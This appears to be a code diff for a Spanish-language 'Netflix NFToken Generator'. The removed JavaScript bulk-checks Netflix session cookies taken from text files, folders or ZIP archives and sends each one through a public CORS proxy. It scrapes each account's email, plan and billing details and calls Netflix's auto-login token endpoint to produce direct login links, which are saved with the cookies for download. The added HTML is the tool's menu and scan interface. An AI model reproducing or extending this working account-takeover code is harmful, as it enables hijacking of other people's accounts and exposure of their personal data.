@@ -1,650 +1,158 @@
-/* ============================================================
-   NETFLIX NFTOKEN GENERATOR - By Eduardo
-   Versión JavaScript (Web)
-============================================================ */
-
-const CONFIG = {
-    OUTPUT_FILE: 'NFToken_Validos.txt',
-    TARGET_DIR_LABEL: '/sdcard/Netflix_Validas',
-    GRAPHQL_URL: 'https://android13.prod.ftl.netflix.com/graphql',
-    USER_AGENT_ACCOUNT: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-    USER_AGENT_GRAPHQL: 'com.netflix.mediaclient/63884 (Linux; U; Android 13; ro; M2007J3SG; Build/TQ1A.230205.001.A2; Cronet/143.0.7445.0)'
-};
-
-/* ============================================================
-   ESTADO GLOBAL
-============================================================ */
-const state = {
-    allItems: [],
-    validCount: 0,
-    invalidCount: 0,
-    processed: 0,
-    outputBuffer: [],
-    results: [],
-    currentMode: null,
-    fileContent: null
-};
-
-/* ============================================================
-   UTILIDADES
-============================================================ */
-function decodeNetflixEscapes(text) {
-    if (!text || text === 'No disponible') return text;
-    try {
-        return text
-            .replace(/\\u([0-9A-Fa-f]{4})/g, (_, hex) => String.fromCharCode(parseInt(hex, 16)))
-            .replace(/\\x([0-9A-Fa-f]{2})/g, (_, hex) => String.fromCharCode(parseInt(hex, 16)))
-            .replace(/\\n/g, '\n')
-            .replace(/\\t/g, '\t')
-            .replace(/\\"/g, '"')
-            .replace(/\\\\/g, '\\');
-    } catch {
-        return text;
-    }
-}
-
-function truncateString(s, maxLen) {
-    if (!s) return '';
-    return s.length <= maxLen ? s : s.slice(0, maxLen - 3) + '...';
-}
-
-/* ============================================================
-   PARSERS
-============================================================ */
-function parseCookieBlocksFromFile(content) {
-    const blocks = [];
-    const lines = content.split(/\r?\n/);
-    let currentLines = [];
-    let currentNetflixId = null;
-
-    for (const rawLine of lines) {
-        const lineStr = rawLine.trim();
-
-        if (!lineStr) {
-            if (currentLines.length && currentNetflixId) {
-                blocks.push({ block: currentLines.join('\n'), netflixId: currentNetflixId });
-                currentLines = [];
-                currentNetflixId = null;
-            }
-            continue;
-        }
-
-        const parts = lineStr.split('\t');
-        const isNetscapeCookie = parts.length >= 6 && (parts[0].startsWith('.') || parts[0].includes('netflix.com'));
-        if (!isNetscapeCookie) continue;
-
-        currentLines.push(rawLine);
-
-        if (parts.length >= 7 && parts[5] === 'NetflixId') {
-            currentNetflixId = parts[6];
-        } else if (lineStr.includes('NetflixId=') && !currentNetflixId) {
-            try {
-                let val = lineStr.split('NetflixId=')[1].split(';')[0].trim();
-                if (val.endsWith('.')) val = val.slice(0, -1);
-                currentNetflixId = val;
-            } catch {}
-        }
-    }
-
-    if (currentLines.length && currentNetflixId) {
-        blocks.push({ block: currentLines.join('\n'), netflixId: currentNetflixId });
-    }
-    return blocks;
-}
-
-function extractNetflixIdsFromRaw(content) {
-    const lines = content.split(/\r?\n/);
-    const ids = [];
-    for (let line of lines) {
-        line = line.trim();
-        if (!line || line.startsWith('#')) continue;
-
-        if (line.startsWith('NetflixId=')) {
-            let v = line.slice(10);
-            if (v.endsWith('.')) v = v.slice(0, -1);
-            ids.push(v);
-        } else {
-            if (line.endsWith('.')) line = line.slice(0, -1);
-            ids.push(line);
-        }
-    }
-    return ids;
-}
-
-/* ============================================================
-   EXTRACCIÓN DE INFO DE CUENTA
-============================================================ */
-function extractAccountInfo(html) {
-    const info = {
-        email: 'No disponible',
-        plan_nombre: 'No disponible',
-        plan_precio: 'No disponible',
-        pais: 'XX',
-        renovacion_fecha: 'No disponible',
-        miembro_desde: 'No disponible'
-    };
-
-    try {
-        const emailMatch = html.match(/"emailAddress":"([^"]+)"/);
-        if (emailMatch) info.email = decodeNetflixEscapes(emailMatch[1]);
-
-        const countryMatch = html.match(/"currentCountry":"([^"]+)"/);
-        if (countryMatch) info.pais = countryMatch[1];
-
-        const planMatch = html.match(/"localizedPlanName":\{[^}]*"value":"([^"]+)"/);
-        if (planMatch) {
-            const planName = planMatch[1].replace(/\\u00E1/g, 'á').replace(/\\u00E9/g, 'é');
-            if (/Basic HD with ads|Basic\\x20HD\\x20with\\x20ads/.test(planName)) {
-                info.plan_nombre = 'Basic HD720p with ads';
-            } else if (/Standard HD with ads|Standard\\x20HD\\x20with\\x20ads/.test(planName)) {
-                info.plan_nombre = 'Standard HD with Ads';
-            } else if (/Premium UHD with ads|Premium\\x20UHD\\x20with\\x20ads/.test(planName)) {
-                info.plan_nombre = 'Premium UHD with Ads';
-            } else if (planName.includes('Basic')) {
-                info.plan_nombre = 'Basic HD720p';
-            } else if (planName.includes('Standard')) {
-                info.plan_nombre = 'Standard HD';
-            } else if (planName.includes('Premium')) {
-                info.plan_nombre = 'Premium UHD';
-            } else {
-                info.plan_nombre = planName;
-            }
-        } else {
-            const fallback = html.match(/(Premium|Standard|Basic|Básico|Estándar|HD|Ultra HD)/i);
-            if (fallback) {
-                info.plan_nombre = fallback[1].charAt(0).toUpperCase() + fallback[1].slice(1).toLowerCase();
-            }
-        }
-
-        const priceMatch = html.match(/"planPrice":\s*\{\s*"fieldType":\s*"String",\s*"value":\s*"([^"]+)"\s*\}/);
-        if (priceMatch) info.plan_precio = decodeNetflixEscapes(priceMatch[1]);
-
-        const billingMatch = html.match(/"nextBillingDate":\s*\{\s*"fieldType":\s*"String",\s*"value":\s*"([^"]+)"\s*\}/);
-        if (billingMatch) info.renovacion_fecha = decodeNetflixEscapes(billingMatch[1]);
-    } catch (e) {
-        console.warn('Error extrayendo info:', e);
-    }
-    return info;
-}
-
-/* ============================================================
-   MOTOR NETFLIX (usando proxies CORS públicos para sortear CORS)
-============================================================ */
-class NetflixTokenGenerator {
-
-    /**
-     * Realiza peticiones usando un proxy CORS público.
-     * NOTA: En producción deberías usar un backend propio (Node/Python).
-     */
-    async fetchConProxy(url, options = {}) {
-        const proxy = 'https://corsproxy.io/?url=' + encodeURIComponent(url);
-        return fetch(proxy, options);
-    }
-
-    async getCookiesAndInfo(netflixId) {
-        try {
-            const headers = {
-                'User-Agent': CONFIG.USER_AGENT_ACCOUNT,
-                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-                'Accept-Language': 'es-ES,es;q=0.9',
-                'Cookie': `NetflixId=${netflixId}`
-            };
-
-            const response = await this.fetchConProxy('https://www.netflix.com/account', {
-                method: 'GET',
-                headers
-            });
-
-            if (!response.ok) return { cookies: null, info: {} };
-
-            const html = await response.text();
-            const accountInfo = extractAccountInfo(html);
-
-            const setCookie = response.headers.get('set-cookie') || '';
-            let secureId = null;
-            const m = setCookie.match(/SecureNetflixId=([^;]+)/);
-            if (m) secureId = m[1];
-
-            if (!secureId) {
-                const m2 = html.match(/SecureNetflixId=([^;"\s]+)/);
-                if (m2) secureId = m2[1];
-            }
-
-            if (!secureId) return { cookies: null, info: accountInfo };
-
-            return {
-                cookies: { NetflixId: netflixId, SecureNetflixId: secureId },
-                info: accountInfo
-            };
-        } catch (e) {
-            console.warn('getCookiesAndInfo error:', e);
-            return { cookies: null, info: {} };
-        }
-    }
-
-    async generateNftoken(cookies) {
-        try {
-            const { NetflixId, SecureNetflixId } = cookies;
-            if (!NetflixId || !SecureNetflixId) return null;
-
-            const cookieStr = `NetflixId=${NetflixId}; SecureNetflixId=${SecureNetflixId}`;
-
-            const payload = {
-                operationName: 'CreateAutoLoginToken',
-                variables: { scope: 'WEBVIEW_MOBILE_STREAMING' },
-                extensions: {
-                    persistedQuery: {
-                        version: 102,
-                        id: '76e97129-f4b5-41a0-a73c-12e674896849'
-                    }
-                }
-            };
-
-            const headers = {
-                'User-Agent': CONFIG.USER_AGENT_GRAPHQL,
-                'Content-Type': 'application/json',
-                'Accept': 'application/json',
-                'Cookie': cookieStr
-            };
-
-            const response = await this.fetchConProxy(CONFIG.GRAPHQL_URL, {
-                method: 'POST',
-                headers,
-                body: JSON.stringify(payload)
-            });
-
-            if (!response.ok) return null;
-            const data = await response.json();
-            if (data.errors) return null;
-            return data?.data?.createAutoLoginToken || null;
-        } catch (e) {
-            console.warn('generateNftoken error:', e);
-            return null;
-        }
-    }
-
-    async processSingleCookie(item) {
-        const { block, netflixId } = item;
-        if (!netflixId) return { token: null, info: {}, success: false, block };
-
-        const { cookies, info } = await this.getCookiesAndInfo(netflixId);
-        if (!cookies) return { token: null, info, success: false, block };
-
-        const token = await this.generateNftoken(cookies);
-        return { token, info, success: !!token, block };
-    }
-}
-
-/* ============================================================
-   FORMATO DE SALIDA
-============================================================ */
-function buildResultBlock(info, token, cookieBlock) {
-    return (
-        '▌║ 𝑵𝑬𝑻𝑭𝑳𝑰𝑿 𝑻𝑶𝑲𝑬𝑵 𝑮𝑬𝑵𝑬𝑹𝑨𝑻𝑶𝑹 ║▌\n' +
-        '🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴\n' +
-        '╭─➤ ❪❪🍿🎬🍿🄸🄽🄵🄾🍿🎬🍿❫❫\n' +
-        '├🔴➤ᗷY ☞︎︎︎ 🅴🅳🆄🅰🆁🅳🅾  \n' +
-        `├🔴➤Correo ➤ ${info.email}\n` +
-        `├🔴➤Plan ➤ ${info.plan_nombre}\n` +
-        `├🔴➤Precio ➤ ${info.plan_precio}\n` +
-        `├🔴➤País ➤ ${info.pais}\n` +
-        `├🔴➤Próxima Facturación ➤ ${info.renovacion_fecha}\n` +
-        `├🔴➤Miembro Desde ➤ ${info.miembro_desde}\n` +
-        `├─➤Link ➤ https://netflix.com/?nftoken=${token}\n` +
-        '├───────────────────────────────\n' +
-        `├🔴➤NFToken ➤ ${token}\n` +
-        `╰─⧳➤Cookie Válida ➤\n${cookieBlock}\n\n` +
-        '═'.repeat(60) + '\n\n'
-    );
-}
-
-/* ============================================================
-   CONTROL DE PANTALLAS
-============================================================ */
-function showScreen(id) {
-    document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
-    document.getElementById(id).classList.add('active');
-}
-
-/* ============================================================
-   MENÚ PRINCIPAL
-============================================================ */
-document.querySelectorAll('.menu-btn').forEach(btn => {
-    btn.addEventListener('click', () => {
-        const action = btn.dataset.action;
-        if (action === 'exit') {
-            if (confirm('¿Estás seguro que deseas salir?')) {
-                document.body.innerHTML = '<div style="text-align:center;padding:60px;color:#00ff88;font-family:monospace;font-size:1.2rem;">¡Gracias por usar el script!<br>Desarrollado por Eduardo.</div>';
-            }
-            return;
-        }
-        state.currentMode = action;
-        renderInputScreen(action);
-    });
-});
-
-/* ============================================================
-   RENDERIZADO DE INPUT
-============================================================ */
-function renderInputScreen(mode) {
-    const title = document.getElementById('input-title');
-    const content = document.getElementById('input-content');
-    const threadsBox = document.querySelector('.threads-box');
-
-    if (mode === 'folder') {
-        title.textContent = `📂 MODO CARPETA: ${CONFIG.TARGET_DIR_LABEL}`;
-        content.innerHTML = `
-            <div class="file-input-wrapper">
-                <label for="folder-files">
-                    📁 Selecciona TODOS los archivos .txt de la carpeta<br>
-                    <small style="color:#4a5a6a">(Equivalente a escanear ${CONFIG.TARGET_DIR_LABEL})</small>
-                </label>
-                <input type="file" id="folder-files" accept=".txt" multiple>
-                <div class="file-name" id="folder-file-name"></div>
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Netflix NFToken Generator - By Eduardo</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="app-container">
+        <!-- Banner -->
+        <header class="banner">
+            <div class="banner-box">
+                <h1>N E T F L I X   N F T O K E N   G E N E R A T O R</h1>
             </div>
-        `;
-        threadsBox.style.display = 'flex';
-        setupFileInput('folder-files', 'folder-file-name', true);
-    } else if (mode === 'zip') {
-        title.textContent = '📦 MODO PROCESAMIENTO ZIP';
-        content.innerHTML = `
-            <div class="file-input-wrapper">
-                <label for="zip-file">📁 Selecciona un archivo .ZIP</label>
-                <input type="file" id="zip-file" accept=".zip">
-                <div class="file-name" id="zip-file-name"></div>
+            <div class="banner-info">
+                <span>► Desarrollado por Eduardo</span>
+                <span class="sep">│</span>
+                <span>By: Eduardo</span>
+                <span class="sep">│</span>
+                <span class="version">v3.0 Premium</span>
             </div>
-        `;
-        threadsBox.style.display = 'flex';
-        setupFileInput('zip-file', 'zip-file-name', false);
-    } else if (mode === 'txt') {
-        title.textContent = '📄 MODO PROCESAMIENTO TXT';
-        content.innerHTML = `
-            <div class="file-input-wrapper">
-                <label for="txt-file">📁 Selecciona un archivo .TXT</label>
-                <input type="file" id="txt-file" accept=".txt">
-                <div class="file-name" id="txt-file-name"></div>
+        </header>
+
+        <!-- Menú principal -->
+        <section id="main-menu" class="screen active">
+            <div class="menu-box">
+                <h2>╔═══════════════════════════════╗</h2>
+                <h2>║       MENÚ PRINCIPAL          ║</h2>
+                <h2>╚═══════════════════════════════╝</h2>
             </div>
-        `;
-        threadsBox.style.display = 'flex';
-        setupFileInput('txt-file', 'txt-file-name', false);
-    }
 
-    showScreen('input-screen');
-}
-
-function setupFileInput(inputId, nameId, multiple) {
-    const input = document.getElementById(inputId);
-    const nameEl = document.getElementById(nameId);
-    input.addEventListener('change', () => {
-        if (!input.files.length) { nameEl.textContent = ''; return; }
-        if (multiple) {
-            nameEl.textContent = `${input.files.length} archivo(s) seleccionado(s)`;
-        } else {
-            nameEl.textContent = input.files[0].name;
-        }
-    });
-}
-
-/* ============================================================
-   BOTÓN VOLVER AL MENÚ
-============================================================ */
-document.getElementById('back-btn').addEventListener('click', () => {
-    state.currentMode = null;
-    showScreen('main-menu');
-});
-
-/* ============================================================
-   INICIAR ESCANEO
-============================================================ */
-document.getElementById('start-btn').addEventListener('click', async () => {
-    const threadsInput = document.getElementById('threads-input').value;
-    let threads = parseInt(threadsInput) || 5;
-    threads = Math.max(1, Math.min(30, threads));
-
-    let items = [];
-
-    try {
-        if (state.currentMode === 'folder') {
-            const files = document.getElementById('folder-files').files;
-            if (!files.length) return alert('⚠ Selecciona al menos un archivo .txt');
-            for (const file of files) {
-                const content = await file.text();
-                items.push(...parseCookieBlocksFromFile(content));
-            }
-        } else if (state.currentMode === 'zip') {
-            const file = document.getElementById('zip-file').files[0];
-            if (!file) return alert('⚠ Selecciona un archivo ZIP');
-            const zip = await JSZip.loadAsync(file);
-            for (const filename of Object.keys(zip.files)) {
-                if (filename.toLowerCase().endsWith('.txt')) {
-                    const content = await zip.files[filename].async('string');
-                    items.push(...parseCookieBlocksFromFile(content));
-                }
-            }
-        } else if (state.currentMode === 'txt') {
-            const file = document.getElementById('txt-file').files[0];
-            if (!file) return alert('⚠ Selecciona un archivo .txt');
-            const content = await file.text();
-            items = parseCookieBlocksFromFile(content);
-
-            if (!items.length) {
-                const ids = extractNetflixIdsFromRaw(content);
-                items = ids.map(id => ({ block: '', netflixId: id }));
-            }
-        }
-    } catch (e) {
-        console.error(e);
-        return alert('Error procesando archivos: ' + e.message);
-    }
-
-    if (!items.length) return alert('⚠ No se encontraron cookies procesables');
-
-    state.allItems = items;
-    state.validCount = 0;
-    state.invalidCount = 0;
-    state.processed = 0;
-    state.outputBuffer = [];
-    state.results = [];
-
-    document.getElementById('bots-active').textContent = threads;
-    startScan(threads);
-});
-
-/* ============================================================
-   ESCANEO
-============================================================ */
-async function startScan(threads) {
-    showScreen('scan-screen');
-    resetScanUI();
-
-    const generator = new NetflixTokenGenerator();
-    const total = state.allItems.length;
-    const queue = [...state.allItems];
-
-    const workers = Array.from({ length: threads }, () => worker(generator, queue, total));
-    await Promise.all(workers);
-
-    finalizeScan();
-}
-
-async function worker(generator, queue, total) {
-    while (queue.length) {
-        const item = queue.shift();
-        if (!item) break;
-
-        const result = await generator.processSingleCookie(item);
-
-        state.processed++;
-        const shortCookie = truncateString(item.netflixId || 'Cookie', 14);
-        document.getElementById('current-cookie').textContent = shortCookie;
-
-        if (result.success) {
-            state.validCount++;
-            const block = buildResultBlock(result.info, result.token, result.block || `NetflixId=${item.netflixId}`);
-            state.outputBuffer.push(block);
-            state.results.push({
-                email: result.info.email,
-                pais: result.info.pais,
-                plan: result.info.plan_nombre
-            });
-            addTableRow(result.info);
-        } else {
-            state.invalidCount++;
-        }
-
-        updateProgress(state.processed, total);
-    }
-}
-
-function resetScanUI() {
-    document.getElementById('progress-bar').style.width = '0%';
-    document.getElementById('progress-percent').textContent = '0.0%';
-    document.getElementById('processed-count').textContent = `000/${String(state.allItems.length).padStart(3, '0')}`;
-    document.getElementById('ok-count').textContent = '00';
-    document.getElementById('fail-count').textContent = '00';
-    document.getElementById('current-cookie').textContent = 'Cookie';
-    document.getElementById('results-body').innerHTML = '';
-}
-
-function updateProgress(processed, total) {
-    const percent = (processed / total) * 100;
-    document.getElementById('progress-bar').style.width = percent + '%';
-    document.getElementById('progress-percent').textContent = percent.toFixed(1) + '%';
-    document.getElementById('processed-count').textContent =
-        `${String(processed).padStart(3, '0')}/${String(total).padStart(3, '0')}`;
-    document.getElementById('ok-count').textContent = String(state.validCount).padStart(2, '0');
-    document.getElementById('fail-count').textContent = String(state.invalidCount).padStart(2, '0');
-}
-
-function addTableRow(info) {
-    const body = document.getElementById('results-body');
-    const row = document.createElement('div');
-    row.className = 'table-row';
-    row.innerHTML = `
-        <div class="col email" title="${escapeHtml(info.email)}">${escapeHtml(truncateString(info.email, 26))}</div>
-        <div class="col pais">${escapeHtml(info.pais)}</div>
-        <div class="col plan" title="${escapeHtml(info.plan_nombre)}">${escapeHtml(truncateString(info.plan_nombre, 12))}</div>
-    `;
-    body.appendChild(row);
-    body.scrollTop = body.scrollHeight;
-}
-
-function escapeHtml(s) {
-    return String(s).replace(/[&<>"']/g, c => ({
-        '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'
-    }[c]));
-}
-
-function finalizeScan() {
-    const total = state.allItems.length;
-    showScreen('summary-screen');
-    document.getElementById('summary-text').innerHTML = `
-        Total analizados: <b>${total}</b><br>
-        Válidas: <span style="color:#00ff88">${state.validCount}</span><br>
-        Inválidas: <span style="color:#ff4d6d">${state.invalidCount}</span><br>
-        <br>
-        📁 Resultados en: <b>${CONFIG.OUTPUT_FILE}</b>
-    `;
-}
-
-/* ============================================================
-   DESCARGAR RESULTADOS
-============================================================ */
-function downloadResults() {
-    if (!state.outputBuffer.length) {
-        return alert('⚠ No hay resultados válidos para descargar');
-    }
-    const blob = new Blob([state.outputBuffer.join('')], { type: 'text/plain;charset=utf-8' });
-    const url = URL.createObjectURL(blob);
-    const a = document.createElement('a');
-    a.href = url;
-    a.download = CONFIG.OUTPUT_FILE;
-    a.click();
-    URL.revokeObjectURL(url);
-}
-
-document.getElementById('download-btn').addEventListener('click', downloadResults);
-document.getElementById('download-btn-2').addEventListener('click', downloadResults);
-
-/* ============================================================
-   VOLVER AL MENÚ (desde escaneo y resumen)
-============================================================ */
-document.getElementById('back-menu-btn').addEventListener('click', () => showScreen('main-menu'));
-document.getElementById('summary-back-btn').addEventListener('click', () => showScreen('main-menu'));
-
-/* ============================================================
-   COOKIE INDIVIDUAL
-============================================================ */
-document.querySelector('.menu-btn[data-action="cookie"]').addEventListener('click', () => {
-    document.getElementById('cookie-input').value = '';
-    const res = document.getElementById('cookie-result');
-    res.classList.add('hidden');
-    res.innerHTML = '';
-    showScreen('cookie-screen');
-});
-
-document.getElementById('cookie-back-btn').addEventListener('click', () => showScreen('main-menu'));
-
-document.getElementById('cookie-start-btn').addEventListener('click', async () => {
-    const raw = document.getElementById('cookie-input').value.trim();
-    const res = document.getElementById('cookie-result');
-    res.classList.remove('hidden');
-
-    if (!raw) {
-        res.className = 'cookie-result error';
-        res.innerHTML = '<h4>✖ No se proporcionó cookie</h4>';
-        return;
-    }
-
-    res.className = 'cookie-result';
-    res.innerHTML = '<h4>⏳ Procesando cookie...</h4>';
-
-    // Detectar NetflixId
-    let netflixId = null;
-    const m = raw.match(/NetflixId=([^;,\s]+)/);
-    if (m) netflixId = m[1];
-
-    if (!netflixId) {
-        res.className = 'cookie-result error';
-        res.innerHTML = '<h4>✖ No se encontró NetflixId en la cookie</h4>';
-        return;
-    }
-
-    const generator = new NetflixTokenGenerator();
-    const result = await generator.processSingleCookie({ block: raw, netflixId });
-
-    if (result.success) {
-        const block = buildResultBlock(result.info, result.token, raw);
-        state.outputBuffer.push(block);
-        state.validCount++;
-
-        res.className = 'cookie-result';
-        res.innerHTML = `
-            <h4>✔ NFToken generado exitosamente</h4>
-            <div class="token-box"><b>🔑 Token:</b> ${escapeHtml(result.token)}</div>
-            <div class="token-box"><b>🔗 Link:</b> https://netflix.com/?nftoken=${escapeHtml(result.token)}</div>
-            <div class="info-line"><span>Correo:</span> ${escapeHtml(result.info.email)}</div>
-            <div class="info-line"><span>Plan:</span> ${escapeHtml(result.info.plan_nombre)}</div>
-            <div class="info-line"><span>Precio:</span> ${escapeHtml(result.info.plan_precio)}</div>
-            <div class="info-line"><span>País:</span> ${escapeHtml(result.info.pais)}</div>
-            <div class="info-line"><span>Próxima facturación:</span> ${escapeHtml(result.info.renovacion_fecha)}</div>
-            <div class="info-line"><span>Miembro desde:</span> ${escapeHtml(result.info.miembro_desde)}</div>
-            <div class="info-line" style="margin-top:10px">
-                <button class="btn primary" onclick="downloadResults()">⬇ Descargar Resultado</button>
+            <div class="menu-options">
+                <button class="menu-btn" data-action="folder">
+                    <span class="num">1.</span> Escanear carpeta <code>/sdcard/Netflix_Validas</code>
+                </button>
+                <button class="menu-btn" data-action="zip">
+                    <span class="num">2.</span> Procesar archivo ZIP
+                </button>
+                <button class="menu-btn" data-action="txt">
+                    <span class="num">3.</span> Procesar archivo TXT único
+                </button>
+                <button class="menu-btn" data-action="cookie">
+                    <span class="num">4.</span> Procesar cookie individual
+                </button>
+                <button class="menu-btn exit" data-action="exit">
+                    <span class="num">0.</span> Salir
+                </button>
             </div>
-        `;
-    } else {
-        res.className = 'cookie-result error';
-        res.innerHTML = '<h4>✖ No se pudo obtener el NFToken</h4><p style="color:#8899aa;font-size:0.8rem;margin-top:8px">La cookie puede estar expirada o el proxy CORS falló.</p>';
-    }
-});
+        </section>
 
-/* ============================================================
-   INICIALIZACIÓN
-============================================================ */
-window.addEventListener('DOMContentLoaded', () => {
-    showScreen('main-menu');
-});
+        <!-- Pantalla de entrada (input file / cookie) -->
+        <section id="input-screen" class="screen">
+            <div class="panel-header">
+                <h3 id="input-title">MODO</h3>
+                <div class="divider"></div>
+            </div>
 
-// Hacer downloadResults accesible desde onclick inline
-window.downloadResults = downloadResults;
+            <div id="input-content"></div>
+
+            <div class="threads-box">
+                <label for="threads-input">🤖 Cantidad de Bots (1-30) [Predeterminado: 5]:</label>
+                <input type="number" id="threads-input" min="1" max="30" value="5">
+            </div>
+
+            <div class="actions">
+                <button id="start-btn" class="btn primary">▶ Iniciar Escaneo</button>
+                <button id="back-btn" class="btn secondary">◀ Volver al Menú</button>
+            </div>
+        </section>
+
+        <!-- Pantalla de escaneo -->
+        <section id="scan-screen" class="screen">
+            <div class="scan-panel">
+                <div class="scan-header">
+                    <span class="dot green"></span> Bots Activos: <span id="bots-active">5</span>
+                    <span class="sep">│</span>
+                    <span class="dot yellow"></span> Estado: <span id="scan-status">Procesando Tokens</span>
+                </div>
+
+                <div class="progress-container">
+                    <div class="progress-bar-bg">
+                        <div id="progress-bar" class="progress-bar-fill"></div>
+                    </div>
+                    <div class="progress-label">
+                        <span id="progress-percent">0.0%</span>
+                    </div>
+                </div>
+
+                <div class="progress-info">
+                    <span>Estado:</span>
+                    <span id="processed-count">000/000</span>
+                    <span class="sep">│</span>
+                    <span class="ok">OK: <span id="ok-count">00</span></span>
+                    <span class="sep">│</span>
+                    <span class="fail">FAIL: <span id="fail-count">00</span></span>
+                    <span class="sep">│</span>
+                    <span id="current-cookie" class="gray">Cookie</span>
+                </div>
+
+                <!-- Tabla de resultados -->
+                <div class="results-table">
+                    <div class="table-header">
+                        <div class="col email">CORREO EXTRAÍDO</div>
+                        <div class="col pais">PAÍS</div>
+                        <div class="col plan">PLAN</div>
+                    </div>
+                    <div id="results-body" class="table-body"></div>
+                </div>
+
+                <div class="actions">
+                    <button id="download-btn" class="btn primary">⬇ Descargar Resultados</button>
+                    <button id="back-menu-btn" class="btn secondary">◀ Volver al Menú</button>
+                </div>
+            </div>
+        </section>
+
+        <!-- Pantalla final / resumen -->
+        <section id="summary-screen" class="screen">
+            <div class="summary-panel">
+                <h2>✔ ESCANEO COMPLETADO</h2>
+                <p id="summary-text"></p>
+                <div class="actions">
+                    <button id="download-btn-2" class="btn primary">⬇ Descargar Resultados</button>
+                    <button id="summary-back-btn" class="btn secondary">◀ Volver al Menú</button>
+                </div>
+            </div>
+        </section>
+
+        <!-- Cookie individual -->
+        <section id="cookie-screen" class="screen">
+            <div class="panel-header">
+                <h3>🍪 MODO COOKIE INDIVIDUAL</h3>
+                <div class="divider"></div>
+            </div>
+
+            <div class="cookie-input-box">
+                <label for="cookie-input">👇 Pega la cookie RAW:</label>
+                <textarea id="cookie-input" placeholder="NetflixId=xxxx&SecureNetflixId=yyyy" rows="4"></textarea>
+            </div>
+
+            <div class="actions">
+                <button id="cookie-start-btn" class="btn primary">▶ Procesar Cookie</button>
+                <button id="cookie-back-btn" class="btn secondary">◀ Volver al Menú</button>
+            </div>
+
+            <div id="cookie-result" class="cookie-result hidden"></div>
+        </section>
+
+        <footer class="footer">
+            <span>🔴 Netflix NFToken Generator • By Eduardo • v3.0 Premium</span>
+        </footer>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
+
